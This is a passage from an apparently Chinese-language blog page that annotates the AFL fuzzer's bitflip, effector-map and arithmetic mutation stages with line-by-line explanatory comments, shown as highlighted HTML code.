&quot;IHDR&quot; string</span><br><span class="hljs-comment">       always produces the same, distinctive path, it&#x27;s highly likely that</span><br><span class="hljs-comment">       &quot;IHDR&quot; is an atomically-checked magic value of special significance to</span><br><span class="hljs-comment">       the fuzzed format.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       We do this here, rather than as a separate stage, because it&#x27;s a nice</span><br><span class="hljs-comment">       way to keep the operation approximately &quot;free&quot; (i.e., no extra execs).</span><br><span class="hljs-comment">       </span><br><span class="hljs-comment">       Empirically, performing the check when flipping the least significant bit</span><br><span class="hljs-comment">       is advantageous, compared to doing it at the time of more disruptive</span><br><span class="hljs-comment">       changes, where the program flow may be affected in more violent ways.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       The caveat is that we won&#x27;t generate dictionaries in the -d mode or -S</span><br><span class="hljs-comment">       mode - but that&#x27;s probably a fair trade-off.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       This won&#x27;t work particularly well with paths that exhibit variable</span><br><span class="hljs-comment">       behavior, but fails gracefully, so we&#x27;ll carry out the checks anyway.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      */</span><br><br>    <span class="hljs-keyword">if</span> (!dumb_mode &amp;&amp; (stage_cur &amp; <span class="hljs-number">7</span>) == <span class="hljs-number">7</span>) &#123;   <span class="hljs-comment">// stage_cur = 7(111), 15(1111), 23(10111), ...</span><br><br>      u32 cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);     <span class="hljs-comment">// 计算trace_bits校验和</span><br>      <br>      <span class="hljs-comment">// 当循环到stage_max - 1次时，比较ck_sum与prev_cksum，即比较当前路径与上一次路径是否变化</span><br>      <br>      <span class="hljs-keyword">if</span> (stage_cur == stage_max - <span class="hljs-number">1</span> &amp;&amp; cksum == prev_cksum) &#123;  <span class="hljs-comment">// 若路径相同</span><br>        <br>        <span class="hljs-comment">/* If at end of file and we are still collecting a string, grab the</span><br><span class="hljs-comment">           final character and force output. */</span><br><br>        <span class="hljs-keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="hljs-number">3</span>]; <span class="hljs-comment">// 若a_len &lt; 32，添加当前字符到a_collec</span><br>        a_len++;<br><br>        <span class="hljs-keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA) <span class="hljs-comment">// 若a_len长度为合法token长度</span><br>          maybe_add_auto(a_collect, a_len);     <span class="hljs-comment">// 将累计的a_collect数组内容添加到a_extras数组中</span><br><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cksum != prev_cksum) &#123; <span class="hljs-comment">// 若路径不同，即发现了新的token</span><br><br>        <span class="hljs-comment">/* Otherwise, if the checksum has changed, see if we have something</span><br><span class="hljs-comment">           worthwhile queued up, and collect that if the answer is yes. */</span><br><br>        <span class="hljs-keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)<br>          maybe_add_auto(a_collect, a_len);     <span class="hljs-comment">// 将a_collect添加到a_extras数组中</span><br><br>        a_len = <span class="hljs-number">0</span>;<br>        prev_cksum = cksum;     <span class="hljs-comment">// 设置prev_cksum为当前cksum</span><br><br>      &#125;<br><br>      <span class="hljs-comment">/* Continue collecting string, but only if the bit flip actually made</span><br><span class="hljs-comment">         any difference - we don&#x27;t want no-op tokens. */</span><br><br>      <span class="hljs-keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;     <span class="hljs-comment">// 若路径不相同，添加当前字节到a_collect中</span><br><br>        <span class="hljs-keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="hljs-number">3</span>];        <br>        a_len++;<br><br>      &#125;<br><br>    &#125;<br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_FLIP1]  += new_hit_cnt - orig_hit_cnt;      <span class="hljs-comment">// stage_finds[STAGE_FLIP1]的值加上在整个FLIP_BIT中新发现的路径和Crash总和</span><br>  stage_cycles[STAGE_FLIP1] += stage_max;       <span class="hljs-comment">// stage_cycles[STAGE_FLIP1]的值加上在整个FLIP_BIT中执行的target次数stage_max</span><br><br>  <span class="hljs-comment">/* Two walking bits. */</span>       <br><br>  stage_name  = <span class="hljs-string">&quot;bitflip 2/1&quot;</span>;  <span class="hljs-comment">// bitflip 2/1，与上述bitflip 1/1过程一样，只是连续翻转2位</span><br>  stage_short = <span class="hljs-string">&quot;flip2&quot;</span>;<br>  stage_max   = (len &lt;&lt; <span class="hljs-number">3</span>) - <span class="hljs-number">1</span>;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (stage_cur = <span class="hljs-number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;<br><br>    stage_cur_byte = stage_cur &gt;&gt; <span class="hljs-number">3</span>;<br><br>    FLIP_BIT(out_buf, stage_cur);<br>    FLIP_BIT(out_buf, stage_cur + <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br><br>    FLIP_BIT(out_buf, stage_cur);<br>    FLIP_BIT(out_buf, stage_cur + <span class="hljs-number">1</span>);<br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_FLIP2]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_FLIP2] += stage_max;<br><br>  <span class="hljs-comment">/* Four walking bits. */</span>      <br><br>  stage_name  = <span class="hljs-string">&quot;bitflip 4/1&quot;</span>;  <span class="hljs-comment">// bitflip 4/1，与上述bitflip 1/1过程一样，只是连续翻转4位</span><br>  stage_short = <span class="hljs-string">&quot;flip4&quot;</span>;<br>  stage_max   = (len &lt;&lt; <span class="hljs-number">3</span>) - <span class="hljs-number">3</span>;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (stage_cur = <span class="hljs-number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;<br><br>    stage_cur_byte = stage_cur &gt;&gt; <span class="hljs-number">3</span>;<br><br>    FLIP_BIT(out_buf, stage_cur);<br>    FLIP_BIT(out_buf, stage_cur + <span class="hljs-number">1</span>);<br>    FLIP_BIT(out_buf, stage_cur + <span class="hljs-number">2</span>);<br>    FLIP_BIT(out_buf, stage_cur + <span class="hljs-number">3</span>);<br><br>    <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br><br>    FLIP_BIT(out_buf, stage_cur);<br>    FLIP_BIT(out_buf, stage_cur + <span class="hljs-number">1</span>);<br>    FLIP_BIT(out_buf, stage_cur + <span class="hljs-number">2</span>);<br>    FLIP_BIT(out_buf, stage_cur + <span class="hljs-number">3</span>);<br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_FLIP4]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_FLIP4] += stage_max;<br><br>  <span class="hljs-comment">/* Effector map setup. These macros calculate:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     EFF_APOS      - position of a particular file offset in the map.</span><br><span class="hljs-comment">     EFF_ALEN      - length of a map with a particular number of bytes.</span><br><span class="hljs-comment">     EFF_SPAN_ALEN - map span for a sequence of bytes.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EFF_APOS(_p)          ((_p) &gt;&gt; EFF_MAP_SCALE2)  <span class="hljs-comment">// p &gt;&gt; 3</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EFF_REM(_x)           ((_x) &amp; ((1 &lt;&lt; EFF_MAP_SCALE2) - 1))      <span class="hljs-comment">// x &amp; 7</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EFF_ALEN(_l)          (EFF_APOS(_l) + !!EFF_REM(_l))    <span class="hljs-comment">// (l &gt;&gt; 3) + !! (l &amp; 7)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EFF_SPAN_ALEN(_p, _l) (EFF_APOS((_p) + (_l) - 1) - EFF_APOS(_p) + 1)    <span class="hljs-comment">// (p + l - 1) &gt;&gt; 3 - (p &gt;&gt; 3) + 1</span></span><br><br>  <span class="hljs-comment">/* Initialize effector map for the next step (see comments below). Always</span><br><span class="hljs-comment">     flag first and last byte as doing something. */</span><br><br>  eff_map    = ck_alloc(EFF_ALEN(len)); <span class="hljs-comment">// 为eff_map分配空间，对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，</span><br>                                        <span class="hljs-comment">// 就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。</span><br>  eff_map[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">if</span> (EFF_APOS(len - <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// len &gt; 9</span><br>    eff_map[EFF_APOS(len - <span class="hljs-number">1</span>)] = <span class="hljs-number">1</span>;<br>    eff_cnt++;<br>  &#125;<br><br>  <span class="hljs-comment">/* Walking byte. */</span><br><br>  stage_name  = <span class="hljs-string">&quot;bitflip 8/8&quot;</span>;  <span class="hljs-comment">// bitflip 8/8与上述位翻转策略不同，以字节为单位进行翻转</span><br>  stage_short = <span class="hljs-string">&quot;flip8&quot;</span>;<br>  stage_max   = len;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (stage_cur = <span class="hljs-number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;<br><br>    stage_cur_byte = stage_cur;<br><br>    out_buf[stage_cur] ^= <span class="hljs-number">0xFF</span>; <span class="hljs-comment">// 翻转策略，与0xff进行异或</span><br><br>    <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br><br>    <span class="hljs-comment">/* We also use this stage to pull off a simple trick: we identify</span><br><span class="hljs-comment">       bytes that seem to have no effect on the current execution path</span><br><span class="hljs-comment">       even when fully flipped - and we skip them during more expensive</span><br><span class="hljs-comment">       deterministic stages, such as arithmetics or known ints. */</span><br>    <br>    <span class="hljs-comment">/* 识别那些即使完全翻转也不会对当前执行路径产生影响的字节，并在更昂贵的</span><br><span class="hljs-comment">    确定性阶段跳过它们，例如算术或已知的整数。 */</span><br><br>    <span class="hljs-keyword">if</span> (!eff_map[EFF_APOS(stage_cur)]) &#123;        <span class="hljs-comment">// eff_map[stage_cur &gt;&gt; 3] == 0</span><br><br>      u32 cksum;<br><br>      <span class="hljs-comment">/* If in dumb mode or if the file is very short, just flag everything</span><br><span class="hljs-comment">         without wasting time on checksums. */</span><br><br>      <span class="hljs-keyword">if</span> (!dumb_mode &amp;&amp; len &gt;= EFF_MIN_LEN)     <span class="hljs-comment">// 如果不是dumb_mode且len &gt;= 128，计算校验和</span><br>        cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);<br>      <span class="hljs-keyword">else</span>      <span class="hljs-comment">// 否则，校验和等于exec_cksum按位取反</span><br>        cksum = ~queue_cur-&gt;exec_cksum;<br><br>      <span class="hljs-keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;     <span class="hljs-comment">// 若发现了新的路径</span><br>        eff_map[EFF_APOS(stage_cur)] = <span class="hljs-number">1</span>;       <span class="hljs-comment">// 设置eff_map[stage_cur &gt;&gt; 3] = 1</span><br>        eff_cnt++;      <span class="hljs-comment">// eff_cnt + 1</span><br>      &#125;<br><br>    &#125;<br><br>    out_buf[stage_cur] ^= <span class="hljs-number">0xFF</span>;         <span class="hljs-comment">// 翻转复位</span><br><br>  &#125;<br><br>  <span class="hljs-comment">/* If the effector map is more than EFF_MAX_PERC dense, just flag the</span><br><span class="hljs-comment">     whole thing as worth fuzzing, since we wouldn&#x27;t be saving much time</span><br><span class="hljs-comment">     anyway. */</span><br><br>  <span class="hljs-keyword">if</span> (eff_cnt != EFF_ALEN(len) &amp;&amp;<br>      eff_cnt * <span class="hljs-number">100</span> / EFF_ALEN(len) &gt; EFF_MAX_PERC) &#123;   <span class="hljs-comment">// eff_map密度大于90(默认)</span><br><br>    <span class="hljs-built_in">memset</span>(eff_map, <span class="hljs-number">1</span>, EFF_ALEN(len));  <span class="hljs-comment">// 将eff_map全部设置为1</span><br><br>    blocks_eff_select += EFF_ALEN(len); <span class="hljs-comment">// block_eff_select + EFF_ALEN(len)</span><br><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br><br>    blocks_eff_select += eff_cnt;       <span class="hljs-comment">// block_eff_select + eff_cnt</span><br><br>  &#125;<br><br>  blocks_eff_total += EFF_ALEN(len);    <span class="hljs-comment">// block_eff_total + EFF_ALEN(len)</span><br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_FLIP8]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_FLIP8] += stage_max;<br><br>  <span class="hljs-comment">/* Two walking bytes. */</span><br><br>  <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">goto</span> skip_bitflip;<br><br>  stage_name  = <span class="hljs-string">&quot;bitflip 16/8&quot;</span>;         <span class="hljs-comment">// bitflip 16/8，与 bitflip 8/8翻转过程相似，一次性翻转两个字节</span><br>  stage_short = <span class="hljs-string">&quot;flip16&quot;</span>;<br>  stage_cur   = <span class="hljs-number">0</span>;<br>  stage_max   = len - <span class="hljs-number">1</span>;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br><br>    <span class="hljs-comment">/* Let&#x27;s consult the effector map... */</span><br><br>    <span class="hljs-keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="hljs-number">1</span>)]) &#123;   <span class="hljs-comment">// 检查eff_map连续两bytes是否为0</span><br>      stage_max--;      <span class="hljs-comment">// stage_max - 1</span><br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    stage_cur_byte = i;<br><br>    *(u16*)(out_buf + i) ^= <span class="hljs-number">0xFFFF</span>;     <span class="hljs-comment">// 翻转两个字节</span><br><br>    <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>    stage_cur++;<br><br>    *(u16*)(out_buf + i) ^= <span class="hljs-number">0xFFFF</span>;     <span class="hljs-comment">// 翻转复位</span><br><br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_FLIP16]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_FLIP16] += stage_max;<br><br>  <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">4</span>) <span class="hljs-keyword">goto</span> skip_bitflip;       <span class="hljs-comment">// 如果len &lt; 4，跳转到skip_bitflip</span><br><br>  <span class="hljs-comment">/* Four walking bytes. */</span><br><br>  stage_name  = <span class="hljs-string">&quot;bitflip 32/8&quot;</span>;         <span class="hljs-comment">// bitflip 32/8，与bitflip 8/8翻转策略一致，但是一次性翻转4bytes</span><br>  stage_short = <span class="hljs-string">&quot;flip32&quot;</span>;<br>  stage_cur   = <span class="hljs-number">0</span>;<br>  stage_max   = len - <span class="hljs-number">3</span>;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">3</span>; i++) &#123;<br><br>    <span class="hljs-comment">/* Let&#x27;s consult the effector map... */</span><br>    <span class="hljs-keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="hljs-number">1</span>)] &amp;&amp;<br>        !eff_map[EFF_APOS(i + <span class="hljs-number">2</span>)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="hljs-number">3</span>)]) &#123;       <span class="hljs-comment">// 检查eff_map连续4bytes是否为空</span><br>      stage_max--;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    stage_cur_byte = i;<br><br>    *(u32*)(out_buf + i) ^= <span class="hljs-number">0xFFFFFFFF</span>; <span class="hljs-comment">// 翻转4个字节</span><br><br>    <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>    stage_cur++;<br><br>    *(u32*)(out_buf + i) ^= <span class="hljs-number">0xFFFFFFFF</span>; <span class="hljs-comment">// 翻转复位</span><br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_FLIP32]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_FLIP32] += stage_max;<br><br>skip_bitflip:<br><br>  <span class="hljs-keyword">if</span> (no_arith) <span class="hljs-keyword">goto</span> skip_arith;        <span class="hljs-comment">// 若no_arith不为空，跳转到skip_arith</span><br></code></pre></td></tr></table></figure><h4 id="ARITHMETIC-INC-x2F-DEC"><a href="#ARITHMETIC-INC-x2F-DEC" class="headerlink" title="ARITHMETIC INC&#x2F;DEC"></a>ARITHMETIC INC&#x2F;DEC</h4><p>对测试用例做简单的算术加减变异，不区分大小端。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 8-bit arithmetics. */</span> <br><br>  stage_name  = <span class="hljs-string">&quot;arith 8/8&quot;</span>;    <span class="hljs-comment">// 1byte算数的加减</span><br>  stage_short = <span class="hljs-string">&quot;arith8&quot;</span>;<br>  stage_cur   = <span class="hljs-number">0</span>;<br>  stage_max   = <span class="hljs-number">2</span> * len * ARITH_MAX;<br><br>  stage_val_type = STAGE_VAL_LE;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><br>    u8 orig = out_buf[i];<br><br>    <span class="hljs-comment">/* Let&#x27;s consult the effector map... */</span><br><br>    <span class="hljs-keyword">if</span> (!eff_map[EFF_APOS(i)]) &#123;        <span class="hljs-comment">// 判断该字节对应eff_map是否有效</span><br>      stage_max -= <span class="hljs-number">2</span> * ARITH_MAX;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    stage_cur_byte = i;<br><br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= ARITH_MAX; j++) &#123;  <span class="hljs-comment">// j &lt;= 35</span><br><br>      u8 r = orig ^ (orig + j);<br><br>      <span class="hljs-comment">/* Do arithmetic operations only if the result couldn&#x27;t be a product</span><br><span class="hljs-comment">         of a bitflip. */</span><br>      <br>      <span class="hljs-comment">// 判断是否可以通过bitflip变异方式获得本次变异结果，若不可以，执行下面分支，否则跳过此阶段</span><br><br>      <span class="hljs-keyword">if</span> (!could_be_bitflip(r)) &#123;       <br><br>        stage_cur_val = j;<br>        out_buf[i] = orig + j;  <span class="hljs-comment">// 加法变异</span><br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>      r =  orig ^ (orig - j);<br><br>      <span class="hljs-keyword">if</span> (!could_be_bitflip(r)) &#123;<br><br>        stage_cur_val = -j;<br>        out_buf[i] = orig - j;  <span class="hljs-comment">// 减法变异</span><br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>      out_buf[i] = orig;        <span class="hljs-comment">// 恢复为原来的值</span><br><br>    &#125;<br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_ARITH8]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_ARITH8] += stage_max;<br><br>  <span class="hljs-comment">/* 16-bit arithmetics, both endians. */</span><br><br>  <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">goto</span> skip_arith;<br><br>  stage_name  = <span class="hljs-string">&quot;arith 16/8&quot;</span>;   <span class="hljs-comment">// arith 16/8 变异方式类似于arith 8/8，只是一次性处理2个字节</span><br>  stage_short = <span class="hljs-string">&quot;arith16&quot;</span>;<br>  stage_cur   = <span class="hljs-number">0</span>;<br>  stage_max   = <span class="hljs-number">4</span> * (len - <span class="hljs-number">1</span>) * ARITH_MAX;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br><br>    u16 orig = *(u16*)(out_buf + i);<br><br>    <span class="hljs-comment">/* Let&#x27;s consult the effector map... */</span><br><br>    <span class="hljs-keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="hljs-number">1</span>)]) &#123;   <span class="hljs-comment">// 判断eff_map[EFF_APOS(i)]与eff_map[EFF_APOS(i + 1)]两个字节是否为空</span><br>      stage_max -= <span class="hljs-number">4</span> * ARITH_MAX;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    stage_cur_byte = i;<br><br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= ARITH_MAX; j++) &#123;<br><br>      u16 r1 = orig ^ (orig + j),       <span class="hljs-comment">// 小端</span><br>          r2 = orig ^ (orig - j),       <span class="hljs-comment">// 小端</span><br>          r3 = orig ^ SWAP16(SWAP16(orig) + j), <span class="hljs-comment">// 大端</span><br>          r4 = orig ^ SWAP16(SWAP16(orig) - j); <span class="hljs-comment">// 大端</span><br><br>      <span class="hljs-comment">/* Try little endian addition and subtraction first. Do it only</span><br><span class="hljs-comment">         if the operation would affect more than one byte (hence the </span><br><span class="hljs-comment">         &amp; 0xff overflow checks) and if it couldn&#x27;t be a product of</span><br><span class="hljs-comment">         a bitflip. */</span><br><br>      stage_val_type = STAGE_VAL_LE; <br><br>      <span class="hljs-keyword">if</span> ((orig &amp; <span class="hljs-number">0xff</span>) + j &gt; <span class="hljs-number">0xff</span> &amp;&amp; !could_be_bitflip(r1)) &#123;  <span class="hljs-comment">// 若r1不能通过bitflip得到，且(orig &amp; 0xff) + j &gt; 0xff</span><br><br>        stage_cur_val = j;<br>        *(u16*)(out_buf + i) = orig + j;        <span class="hljs-comment">// 加法变异</span><br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br> <br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>      <span class="hljs-keyword">if</span> ((orig &amp; <span class="hljs-number">0xff</span>) &lt; j &amp;&amp; !could_be_bitflip(r2)) &#123; <span class="hljs-comment">// 若r2不能通过bitflip得到，且(orig &amp; 0xff) &lt; j</span><br><br>        stage_cur_val = -j;<br>        *(u16*)(out_buf + i) = orig - j;        <span class="hljs-comment">// 减法变异</span><br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>      <span class="hljs-comment">/* Big endian comes next. Same deal. */</span><br><br>      stage_val_type = STAGE_VAL_BE;    <span class="hljs-comment">// 大端</span><br><br>      <span class="hljs-keyword">if</span> ((orig &gt;&gt; <span class="hljs-number">8</span>) + j &gt; <span class="hljs-number">0xff</span> &amp;&amp; !could_be_bitflip(r3)) &#123;    <span class="hljs-comment">// 若r3不能通过bitflip得到，且(orig &gt;&gt; 8) + j &gt; 0xff</span><br><br>        stage_cur_val = j;<br>        *(u16*)(out_buf + 